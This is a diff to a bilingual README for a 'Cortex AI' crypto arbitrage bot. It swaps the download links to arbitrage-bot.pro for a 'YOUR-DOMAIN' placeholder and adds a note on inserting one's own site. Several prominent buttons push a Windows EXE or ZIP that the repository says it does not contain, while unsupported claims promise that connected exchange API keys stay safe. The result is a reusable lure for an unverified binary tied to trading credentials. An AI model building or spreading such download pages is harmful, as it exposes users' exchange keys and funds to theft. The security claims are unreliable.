@@ -19,15 +19,17 @@
 > [!WARNING]
 > 本仓库的 Python 源码仅包含演示性扫描与执行模块，**不包含** README 中提到的 `CortexLauncher.exe`。不要把第三方网站上的二进制文件或 ZIP 与本仓库视为同一发布物，也不要在包含交易所 API Key、私钥或浏览器凭据的主机上运行未经验证的二进制文件。使用前请检查来源、发布签名与 SHA-256，并在隔离环境中进行验证。
 
+> [!NOTE]
+> 发布下载入口时，仅需把下方 README 中出现的 `https://YOUR-DOMAIN/download.php` 与 `https://YOUR-DOMAIN/` 替换成你的正式站点地址即可；仓库源码本身不需要大改。
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://YOUR-DOMAIN/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI" width="350">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 14px 28px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 20px rgba(0, 255, 163, 0.4);">
+  <a href="https://YOUR-DOMAIN/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 14px 28px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 20px rgba(0, 255, 163, 0.4);">
     ⚡下载官方 Cortex AI 官方版下载｜Windows EXE
   </a>
 </p>
@@ -59,7 +61,7 @@ To ensure core system integrity, automatic updates, and real-time node synchroni
 ### ⬇️ 下载与安装 (Download & Install)
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 15px rgba(0, 255, 163, 0.3);">
+  <a href="https://YOUR-DOMAIN/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 15px rgba(0, 255, 163, 0.3);">
     🚀 下载 Cortex AI 交易机器人基础架构（稳定版 ZIP）
   </a>
 </p>
@@ -70,8 +72,8 @@ To ensure core system integrity, automatic updates, and real-time node synchroni
 * **核心同步:** 在本地安全连接您的 API 密钥，即可实时同步 **bybit bot** 与 **okx trading** 数据流水线。硬件级内存加密技术确保您的私钥永不离机。
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/">
-    <img src="https://img.shields.io/badge/官方网站-arbitrage--bot.pro-00E676?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Cortex AI Official Website">
+  <a href="https://YOUR-DOMAIN/">
+    <img src="https://img.shields.io/badge/官方网站-YOUR--DOMAIN-00E676?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Cortex AI Official Website">
   </a>
   &nbsp;&nbsp;
   <a href="https://github.com/Cortex-AI-Quant/crypto-arbitrage-bot-automated-trading">
